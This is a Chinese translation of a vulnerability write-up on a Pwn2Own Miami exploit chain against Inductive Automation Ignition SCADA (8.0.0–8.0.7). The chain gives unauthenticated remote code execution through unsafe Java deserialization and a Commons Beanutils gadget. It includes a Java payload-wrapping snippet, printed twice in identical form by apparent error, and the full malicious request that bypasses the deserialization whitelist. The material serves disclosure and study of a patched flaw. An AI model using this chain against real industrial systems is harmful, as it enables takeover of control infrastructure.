# Pwn2Own Write-Up：Inductive Automation产品的漏洞利用三重奏

阅读量 **193667**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-06-17 11:30:05

 **x**

##### 译文声明

本文是翻译文章，文章原作者 thezdi，文章来源：thezdi.com

原文地址：<https://www.thezdi.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01725c4c4216478176.png)

## 一、概述

2020年1月，在S4会议上举行了首届Pwn2Own Miami竞赛，目标是工业控制系统（ICS）产品。在比赛中，Pedro Ribeiro和Radek
Domanski的团队利用信息泄露和不安全的反序列化漏洞，成功在Inductive Automation
Ignition系统上实现了代码执行。在比赛第一天结束后，他们就赢得了25000美元的奖励。目前，这些漏洞已经可以从厂商处获得补丁程序，同时漏洞发现团队提供了以下Write-Up和演示视频。

这篇文章描述了Pedro Ribeiro（[@pedrib1337](https://github.com/pedrib1337
"@pedrib1337")）和Radek Domanski（[@RabbitPro](https://github.com/RabbitPro
"@RabbitPro")）发现的一系列Java漏洞。这些漏洞在1月份举行的ZDI Pwn2Own Miami
2020比赛中利用。所描述的漏洞存在于8.0.0 – 8.0.7（含8.0.7）版本的 Inductive Automation Ignition
SCADA产品中。厂商已经在最近修复了这些漏洞，并建议用户升级到8.0.10版本。在下面的视频中，快速介绍了所发现的漏洞：

<https://youtu.be/CuOancRm1fg>

使用默认配置的Ignition可能被未经身份验证的攻击者实现漏洞利用，一旦攻击者成功利用，将可能获得Windows SYSTEM或Linux
root权限的远程代码执行。  
在他们的漏洞利用链中，共组合利用了三个漏洞来实现代码执行，这些漏洞分别是：

1、未经授权对敏感资源的访问漏洞；

2、不安全的Java反序列化；

3、使用不安全的Java库。

本文分析的所有代码，都是通过反编译8.0.7版本的JAR文件所获得的。

## 二、漏洞详情

在深入研究漏洞之前，我们首先要介绍一下有关Ignition和/system/gateway终端的背景知识。Ignition负责侦听大量的TCP和UDP端口，因为除了其主要功能外，它还必须处理多种SCADA协议。

其中使用的主要端口是TCP 8088和TCP/TLS
8043，它们用于通过HTTP（HTTPS）协议控制管理服务器，并处理各种Ignition组件之间的通信。

有多个API终端会持续侦听该端口，但我们关注的是其中的/system/gateway。这个API终端允许用户执行远程函数调用。未经身份验证的用户仅能调用其中的几个函数，而`Login.designer()`函数就是其中之一。该函数使用包含序列化Java对象的XML与客户端进行通信。其代码位于`com.inductiveautomation.ignition.gateway.servlets.Gateway`类中。

通常，使用序列化的Java对象执行客户端-服务器（CS）通信可以导致直接的代码执行，但是在这里，这个过程并不是那么简单。在深入探讨之前，首先让我们看一下`Login.designer()`请求的内容：

    
    
    <!--    POST /system/gateway HTTP/1.1 
    Content-type: text/xml 
    User-Agent: Java/11.0.4 
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 
    Connection: keep-alive 
    Content-Length: 845
    -->
    <?xml version="1.0" encoding="UTF-8"?>
    <requestwrapper>
        <version>964325727</version>
        <scope>2</scope>
        <message>
            <messagetype>199</messagetype>
            <messagebody>
                <arg name="funcId">
                    <![CDATA[Login]]>
                </arg>
                <arg name="subFunction">
                    <![CDATA[designer]]>
                </arg>
                <arg name="arg" index="0">
                    <![CDATA[H4sIAAAAAAAAAFvzloG1hMG1Wqm0OLUoLzE3VTc1L1nJSinFMMnQyDApMdnEyCzJyDhVSUepILG4 
    uDy/KAWXiloAvpMDvEwAAAA=]]>
                </arg>
                <arg name="arg" index="1">
                    <![CDATA[H4sIAAAAAAAAAFvzloG1uIhBMCuxLFEvJzEvXc8zryQ1PbVI6NGCJd8b2y2YGBg9GVjLEnNKUyuKGAQQ6vxKc5NSi9rWTJXlnvKgm4mBoaKgItLQAACH6ksSUQAAAA==]]>
                </arg>
                <arg name="arg" index="2">
                    <![CDATA[H4sIAAAAAAAAAFvzloG1hIHXtbQovyBV3yc/LyU/DwDHsV9XFAAAAA==]]>
                </arg>
                <arg name="arg" index="3">
                    <![CDATA[H4sIAAAAAAAAAFvzloG1hIHfxTXYO8Q/QNc/MDDE1MkYAOTFO60WAAAA]]>
                </arg>
            </messagebody>
        </message>
        <locale>
            <l>en</l>
            <c>GB</c>
            <v></v>
        </locale>
    </requestwrapper>
    

响应如下：

    
    
    <--    HTTP/1.1 200 OK 
    Date: Sun, 24 Nov 2019 00:33:56 GMT 
    Content-Type: text/xml 
    Server: Jetty(9.4.8.v20180619) 
    Content-Length: 1254
    -->
    <?xml version="1.0" encoding="UTF-8"?>
    <ResponseWrapper>
        <Response>
            <SerializedResponse>
                H4sIAAAAAAAAAKVUz2sTQRid/NgktbUmFlp66EH00ktyEyFCTSvFaFqFqrT04mR3spkwu7POzKbb
                IIVeitCDpSpSRVrQi1D04F9QPAiiQgv24EUPXoVevfnNbpK2eFFcyGb5vjffj/fe7vZPZEiBJkzu
                5Klr+aaiTYJ9xR2sKHfz1HZp+AAAB/58SUR+HEtqlnxVJ66iJlbEugXh4Oa9D1Ovx4biKFZBPYo6
                RCrseAplKw3cxAVfUVa4DOhiIND5f2+oe+wMLa0Mz8VycWRUUK/JXYVNVXZr/HiXCpWqWEFxaik0
                GMUpL8wQQTGjLVxlBLK9nuA1ysg0dohCpyMYw65dmFGCujZADMEZbNGpEdae4IwRU48IgAFp1onl
                M1KyGr5UDhAi76IllIAVx/52RVijRu1oyRuCe0SoxRkYKbpiIZ+pJma+HuXUkVGmsFcMPJAvp2N5
                HctfwbIOcSP9defd4J3dBIpPohOMY2sSmOKiDMrUBZF1zqzAG7sUtuhbyMA9C780FLv4P3OTN7tb
                Jb+QjqNkGRl1k1sEaDQZbrUUyh3heIJhKYHBPovUsM/Ubb3fcRmuVxtANGCSLkikaTUCz1h/9qIp
                UDbcWMPykVpbBy8vtIpvx+MIBR6Yzqhiy9Ykhnr07dfWn+iHnEKpElvAi0BlpiNeNxZh07/8YoiF
                Mj01KqRyQ4u0S6XGp3c6acPlSqvSTm3uPZxtd4mDFVBGD+hjm3hR/mD0/n7naEY7OyqcMrEgCkeY
                V/17Z7oYIKnTPJDtt8bm3GbkUITQjvmy4/hKO1t7/1zH6sSa5MJpOwmBk+ZRhjAS+lShgfk/2Q48
                X3QSEb/txNrn2c2sHGUhwboazNN/iKpweGNWf6x9fHD2G/S5iozQscExqaZ9p0rEyvbjkd5H31e7
                lbTLFUq3nQB1Bw79XBICL+qdguW9kY33+HkCxcooKWG38HBsIRkdP1myHOoCUGDweaApHO2OGJbS
                3556Yzl2bU4NJ3RvbfuY+/TLxqfgN5dVns8IBQAA
            </SerializedResponse>
            <errorNo>0</errorNo>
        </Response>
        <SetCookie>D07B61A39DAE828E35134292A70777A4</SetCookie>
    </ResponseWrapper>
    

在请求和响应中，包含序列化的Java对象，这些对象传递给可以远程调用的函数。上面的示例中，展示了对带有四个参数的`com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login`类`designer()`函数的调用。

在到达`Login.designer()`之前，调用栈如下：

    
    
    com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost()
    com.inductiveautomation.ignition.gateway.servlets.gateway.AbstractGatewayFunction.invoke()
    com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login.designer()
    

`Gateway.doPost()`
Servlet会执行一些版本和完整性检查，然后将请求发送到`AbstractGatewayFunction.invoke()`，该请求在调用`Login.designer()`之前进行解析和验证，如下所示：

    
    
    public final void invoke(GatewayContext context, PrintWriter out, ClientReqSession session, String projectName, Message msg) { 
        String funcName = msg.getArg("subFunction"); 
        AbstractGatewayFunction.SubFunction function = null; 
        if (TypeUtilities.isNullOrEmpty(funcName)) { 
            function = this.defaultFunction; 
        } else { 
            function = (AbstractGatewayFunction.SubFunction)this.functions.get(funcName); 
        } 
        if (function == null) { 
            Gateway.printError(out, 500, "Unable to locate function '" + this.getFunctionName(funcName) + "'", (Throwable)null); 
        } else if (function.reflectionErrorMessage != null) { 
            Gateway.printError(out, 500, "Error loading function '" + this.getFunctionName(funcName) + "'", (Throwable)null); 
        } else { 
            Set<Class<?>> classWhitelist = null; 
            int i; 
            Class argType; 
            if (!this.isSessionRequired()) { 
                classWhitelist = Sets.newHashSet(SaferObjectInputStream.DEFAULT_WHITELIST); 
                Class[] var9 = function.params; 
                int var10 = var9.length; 
                for(i = 0; i < var10; ++i) { 
                    argType = var9[i]; 
                    classWhitelist.add(argType); 
                } 
                if (function.retType != null) { 
                    classWhitelist.add(function.retType); 
                } 
            } 
            List<String> argList = msg.getIndexedArg("arg"); 
            Object[] args; 
            if (argList != null && argList.size() != 0) { 
                args = new Object[argList.size()]; 
                for(i = 0; i < argList.size(); ++i) { 
                    if (argList.get(i) == null) { 
                        args[i] = null; 
                    } else { 
                        try { 
                            args[i] = Base64.decodeToObjectFragile((String)argList.get(i), classWhitelist); 
                        } catch (ClassNotFoundException | IOException var15) { 
                            ClassNotFoundException cnfe = null; 
                            if (var15.getCause() instanceof ClassNotFoundException) { 
                                cnfe = (ClassNotFoundException)var15.getCause(); 
                            } else if (var15 instanceof ClassNotFoundException) { 
                                cnfe = (ClassNotFoundException)var15; 
                            } 
                            if (cnfe != null) { 
                                Gateway.printError(out, 500, this.getFunctionName(funcName) + ": Argument class not valid.", cnfe); 
                            } else { 
                                Gateway.printError(out, 500, "Unable to read argument", var15); 
                            } 
                            return; 
                        } 
                    } 
                } 
            } else { 
                args = new Object[0]; 
            } 
            if (args.length != function.params.length) { 
                String var10002 = this.getFunctionName(funcName); 
                Gateway.printError(out, 202, "Function '" + var10002 + "' requires " + function.params.length + " arguments, got " + args.length, (Throwable)null); 
            } else { 
                for(i = 0; i < args.length; ++i) { 
                    argType = function.params[i]; 
                    if (args[i] != null) { 
                        try { 
                            args[i] = TypeUtilities.coerce(args[i], argType); 
                        } catch (ClassCastException var14) { 
                            Gateway.printError(out, 202, "Function '" + this.getFunctionName(funcName) + "' argument " + (i + 1) + " could not be coerced to a " + argType.getSimpleName(), var14); 
                            return; 
                        } 
                    } 
                } 
                try { 
                    Object[] fullArgs = new Object[args.length + 3]; 
                    fullArgs[0] = context; 
                    fullArgs[1] = session; 
                    fullArgs[2] = projectName; 
                    System.arraycopy(args, 0, fullArgs, 3, args.length); 
                    if (function.isAsync) { 
                        String uid = context.getProgressManager().runAsyncTask(session.getId(), new MethodInvokeRunnable(this, function.method, fullArgs)); 
                        Gateway.printAsyncCallResponse(out, uid); 
                        return; 
                    } 
                    Object obj = function.method.invoke(this, fullArgs); 
                    if (obj instanceof Dataset) { 
                        Gateway.datasetToXML(out, (Dataset)obj); 
                        out.println("<errorNo>0</errorNo></Response>"); 
                    } else { 
                        Serializable retVal = (Serializable)obj; 
                        Gateway.printSerializedResponse(out, retVal); 
                    } 
                } catch (Throwable var16) { 
                    Throwable ex = var16; 
                    Throwable cause = var16.getCause(); 
                    if (var16 instanceof InvocationTargetException && cause != null) { 
                        ex = cause; 
                    } 
                    int errNo = 500; 
                    if (ex instanceof GatewayFunctionException) { 
                        errNo = ((GatewayFunctionException)ex).getErrorCode(); 
                    } 
                    LoggerFactory.getLogger("gateway.clientrpc.functions").debug("Function invocation exception.", ex); 
                    Gateway.printError(out, errNo, ex.getMessage() == null ? "Error executing gateway function." : ex.getMessage(), ex); 
                } 
            } 
        } 
    }
    

该函数执行以下操作：

1、解析收到的消息；  
2、标识需要调用的函数；  
3、检查函数参数，确定它们是否可以安全地反序列化；  
4、确保参数的数量与目标函数的预期数量相对应；  
5、调用带有反序列化参数的函数；  
6、将响应发送回客户端。

在反序列化之前，需要检查参数，以确保它们包含“safe”对象。这一过程是通过从`com.inductiveautomation.ignition.common.Base64`调用`decodeToObjectFragile()`来完成的。该函数有两个参数：带有Base64编码对象的字符串，以及可以反序列化的被允许类列表。

    
    
    public static Object decodeToObjectFragile(String encodedObject, Set<Class<?>> classWhitelist) throws ClassNotFoundException, IOException { 
        byte[] objBytes = decode(encodedObject, 2); 
        ByteArrayInputStream bais = null; 
        ObjectInputStream ois = null; 
        Object obj = null; 
        try { 
            bais = new ByteArrayInputStream(objBytes); 
            if (classWhitelist != null) { 
                ois = new SaferObjectInputStream(bais, classWhitelist); 
            } else { 
                ois = new ObjectInputStream(bais); 
            } 
            obj = ((ObjectInputStream)ois).readObject(); 
        } finally { 
            try { 
                bais.close(); 
            } catch (Exception var15) { 
            } 
            try { 
                ((ObjectInputStream)ois).close(); 
            } catch (Exception var14) { 
            } 
        } 
        return obj; 
    }
    

如上所示，如果`decodeToObjectFragile()`接收到null，而不是允许的类列表，则它将使用“normal”`ObjectInputStream`对对象进行反序列化，从而带来一些问题和风险点。但是，如果指定了允许列表，则`decodeToObjectFragile`将使用`SaferObjectInputStream`类来反序列化对象。

`SaferObjectInputStream`类是`ObjectInputStream`的包装，用于检查需要反序列化的每个对象的类。如果该类不是允许列表的一部分，则会拒绝所有输入，并在产生任何有害影响之前终止处理。相关代码如下：

    
    
    public class SaferObjectInputStream extends ObjectInputStream { 
        public static final Set<Class<?>> DEFAULT_WHITELIST = ImmutableSet.of(String.class, Byte.class, Short.class, Integer.class, Long.class, Number.class, new Class[]{Float.class, Double.class, Boolean.class, Date.class, Color.class, ArrayList.class, HashMap.class, Enum.class}); 
        private final Set<String> whitelist; 
        public SaferObjectInputStream(InputStream in) throws IOException { 
            this(in, DEFAULT_WHITELIST); 
        } 
        public SaferObjectInputStream(InputStream in, Set<Class<?>> whitelist) throws IOException { 
            super(in); 
            this.whitelist = new HashSet(); 
            Iterator var3 = whitelist.iterator(); 
            while(var3.hasNext()) { 
                Class<?> c = (Class)var3.next(); 
                this.whitelist.add(c.getName()); 
            } 
        } 
        protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException { 
            ObjectStreamClass ret = super.readClassDescriptor(); 
            if (!this.whitelist.contains(ret.getName())) { 
                throw new ClassNotFoundException(String.format("Unexpected class %s encountered on input stream.", ret.getName())); 
            } else { 
                return ret; 
            } 
        } 
    }
    

从上面的代码片段中可以看出，默认的允许列表（`DEFAULT_WHITELIST`）非常严格。它仅允许反序列化以下对象类型：

    
    
          -- String
          -- Byte
          -- Short
          -- Integer
          -- Long
          -- Number
          -- Float
          -- Double
          -- Boolean
          -- Date
          -- Color
          -- ArrayList
          -- HashMap
          -- Enum
    

由于上述这些都是非常简单的类型，因此我们在这里描述的机制是防范大多数Java反序列化攻击的有效方法。

在本文中，由于篇幅限制，我们难以详细解释Java反序列化发生的方式及可能导致的破坏性影响。如果大家有兴趣阅读关于该漏洞的更多信息，建议阅读Java
Unmarshaller Security或Foxglove Security的博客文章。接下来，我们来看看在Pwn2Own中使用的漏洞利用链。

## 三、未授权访问敏感资源漏洞

漏洞利用链中的第一个漏洞是信息泄露，但并没有在我们的漏洞利用过程中用到。未经身份验证的攻击者可以调用“project
diff”功能来获取有关项目的关键信息。在我们的案例中，我们以此为跳板来攻击其他功能。

在`com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload`类中，包含许多未经身份验证的远程攻击者可以访问的操作，其中的一个函数就是`getDiffs()`，如下所示：

    
    
    @GatewayFunction 
    public String getDiffs(GatewayContext context, HttpSession session, String sessionProject, String projectSnapshotsBase64) throws GatewayFunctionException { 
        try { 
            List<ProjectSnapshot> snapshots = (List<ProjectSnapshot>)Base64.decodeToObjectFragile(projectSnapshotsBase64); 
            RuntimeProject p = ((RuntimeProject)context.getProjectManager().getProject(sessionProject).orElseThrow(() -> new ProjectNotFoundException(sessionProject))).validateOrThrow(); 
            List<ProjectDiff.AbsoluteDiff> diffs = context.getProjectManager().pull(snapshots); 
            return (diffs == null) ? null : Base64.encodeObject(Lists.newArrayList(diffs)); 
        } catch (Exception e) { 
            throw new GatewayFunctionException(500, "Unable to load project diff.", e); 
        }  
    }
    

如上所示的函数会将提供的数据与服务器中的项目数据进行比较，并返回二者的差异。如果攻击者提供了有效的项目名称，那么服务器可能会提供（泄露）所有项目数据。

同样，这个功能并没有在我们的漏洞利用中使用。而相反，该功能用于进一步攻击系统的跳板，下面将对此展开进一步的说明。

## 四、不安全的Java反序列化漏洞

从上面的代码片段中可以看出，`ProjectDownload.getDiffs()`使用`Base64.decodeToObjectFragile()`函数对项目数据进行解码。之前的代码中已经解释了该函数。如上所示，如果该函数的第二个参数中未提供允许的类的列表，则它将使用标准的不安全`ObjectInputStream`类来对指定的对象进行解码。这样一来，将会产生一个经典的Java反序列化漏洞，当其与最后一个漏洞共同使用时，最终会导致远程执行代码。

## 五、使用不安全Java库问题

漏洞利用链中的最后一个漏洞，是将Java类与易受攻击的Java
Gadget对象一起滥用，这些对象可以用于实现远程代码执行。对于我们来说比较幸运的是，Ignition就是如此。它使用了Apache Commons
Beanutils的一个非常老的版本1.9.2，该版本发布于2013年。

在知名的ysererial Java反序列化漏洞利用工具CommonsBeanutils1中，有一个针对该库的Payload。

## 六、漏洞组合利用

总而言之，要实现远程代码执行，我们需要执行以下操作：

1、创建一个ysoserial CommonsBeanutils1 Payload；  
2、将Payload进行Base64编码；  
3、将Payload封装在Java `String`对象中；  
4、使用标准的Java序列化功能对`String`对象进行序列化；  
5、对序列化后的`String`对象进行Base64编码；  
6、使用恶意参数将请求发送到/system/gateway，调用`getDiffs()`。

这样一来，我们就能绕过序列化的白名单，并执行我们的代码！但是，具体要如何实现呢？我们还需要深入研究一下。

我们的Payload将具有以下格式：

    
    
    base64(String(base64(YSOSERIAL_PAYLOAD))
    

上面代码片段中展示过的代码将对其进行Base64解码，这将导致：

    
    
    String(base64(YSOSERIAL_PAYLOAD))
    

由于它是`String`类，因此根据上一章中的白名单进行了检查，检查结果将允许对其进行反序列化。然后，就进入到了`ProjectDownload.getDiffs()`，它使用我们的`String`参数，在不指定白名单的情况下对其调用`Base64.decodeToObjectFragile()`。

如之前展示的代码所示，这将导致`String`被Base64解码，然后在我们的恶意对象（`YSOSERIAL_PAYLOAD`）
上调用`ObjectInputStream.readObject()`，从而导致代码执行！

## 七、编写Payload

要编写我们的Payload，首先需要调用`ysoserial`，如下所示：

    
    
    public static void main(String[] args) { 
        try { 
            String payload = "<YSOSERIAL_BASE64_PAYLOAD>"; 
            ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(bos); 
            objectOutputStream.writeObject(payload); 
            objectOutputStream.close(); 
            byte[] encodedBytes = Base64.getEncoder().encode(bos.toByteArray()); 
            FileOutputStream fos = new FileOutputStream("/tmp/output"); 
            fos.write(encodedBytes); 
            fos.close(); 
            bos.close(); 
        } catch (Exception e) { 
            e.printStackTrace(); 
        } 
    }
    

然后，可以使用以下Java代码将Payload封装在String里面，并将其序列化到磁盘中：

    
    
    public static void main(String[] args) { 
        try { 
            String payload = "<YSOSERIAL_BASE64_PAYLOAD>"; 
            ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(bos); 
            objectOutputStream.writeObject(payload); 
            objectOutputStream.close(); 
            byte[] encodedBytes = Base64.getEncoder().encode(bos.toByteArray()); 
            FileOutputStream fos = new FileOutputStream("/tmp/output"); 
            fos.write(encodedBytes); 
            fos.close(); 
            bos.close(); 
        } catch (Exception e) { 
            e.printStackTrace(); 
        } 
    }
    

在这段代码中，`<YSOSERIAL_BASE64_PAYLOAD>`应该包含上述代码的输出。

最后，我们将以下请求发送到目标：

    
    
    <!--    POST /system/gateway HTTP/1.1
    Content-type: text/xml 
    User-Agent: Java/11.0.4 
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: keep-alive 
    Content-Length: 1337
    -->
    
    <?xml version="1.0" encoding="UTF-8"?>
    <requestwrapper>
        <version>1184437744</version>
        <scope>2</scope>
        <message>
            <messagetype>199</messagetype>
            <messagebody>
                <arg name="funcId">
                    <![CDATA[ProjectDownload]]>
                </arg>
                <arg name="subFunction">
                    <![CDATA[getDiff]]>
                </arg>
                <arg name="arg" index="0">
                    <![CDATA[<PAYLOAD>]]>
                </arg>
            </messagebody>
        </message>
        <locale>
            <l>en</l>
            <c>GB</c>
            <v></v>
        </locale>
    </requestwrapper>
    

`<PAYLOAD>`中将包含正在运行的代码段的输出，目标响应如下：

    
    
    <!-- 
    HTTP/1.1 200 OK 
    Date: Sat, 11 Jan 2020 10:17:55 GMT 
    Content-Type: text/xml 
    Server: Jetty(9.4.20.v20190813) 
    Content-Length: 7760
    -->
    
    <?xml version="1.0" encoding="UTF-8"?>
    <ResponseWrapper>
        <Response>
            <errorNo>500</errorNo>
            <errorMsg>Unable to load project diff.</errorMsg>
            <StackTrace>
                <ExceptionMsg>Unable to load project diff.</ExceptionMsg>
                <ExceptionString>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException: Unable to load project diff.</ExceptionString>
                <ExceptionCls>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException</ExceptionCls>
                <ExceptionOTS>false</ExceptionOTS>
                <StackTraceElem>
                    <decl>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload</decl>
                    <meth>getDiff</meth>
                    <file>ProjectDownload.java</file>
                    <line>52</line>
                </StackTraceElem>
                <StackTraceElem>
                    <decl>jdk.internal.reflect.NativeMethodAccessorImpl</decl>
                    <meth>invoke0</meth>
                    <file>null</file>
                    <line>-2</line>
                </StackTraceElem>
                <StackTraceElem>
                    <decl>jdk.internal.reflect.NativeMethodAccessorImpl</decl>
                    <meth>invoke</meth>
                    <file>null</file>
                    <line>-1</line>
                </StackTraceElem>
                <StackTraceElem>
                    <decl>jdk.internal.reflect.DelegatingMethodAccessorImpl</decl>
                    <meth>invoke</meth>
                    <file>null</file>
                    <line>-1</line>
                </StackTraceElem>
            <!-- (...) -->
    

在响应中，包含一个栈跟踪，表明其中存在一些问题，但Payload是以SYSTEM权限（在Linux中是以root）来执行的。

使用上面提供的Payload，文件将位于`C:flashback.txt`中，其中的文本为`nt
authoritysystem`。这表明我们已经成功实现了未经身份验证的远程代码执行。

## 八、总结

在本文中，我们对在Pwn2Own Miami中发现的漏洞利用展开了详细分析，Inductive
Automation已经在8.0.10版本中修复了这些漏洞。在新版本中，还包含许多其他修复程序和新功能，如果大家想要自行测试，为方便起见，我们发布了Metasploit模块。在本文开头的视频中，可以看到该模块的运行情况。

再次感谢Pedro和Radek提供的出色文章，并感谢他们对Pwn2Own
Miami的贡献。我们期待后续能收到更多来自他们的投稿，在此之前，欢迎关注该团队以获取组新的漏洞利用技术和安全补丁。

本文翻译自thezdi.com [原文链接](https://www.thezdi.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/208464](/post/id/208464)

安全客 - 有思想的安全新媒体

本文转载自: [thezdi.com](https://www.thezdi.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami)

如若转载,请注明出处： <https://www.thezdi.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [工控安全](/tag/工控安全)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

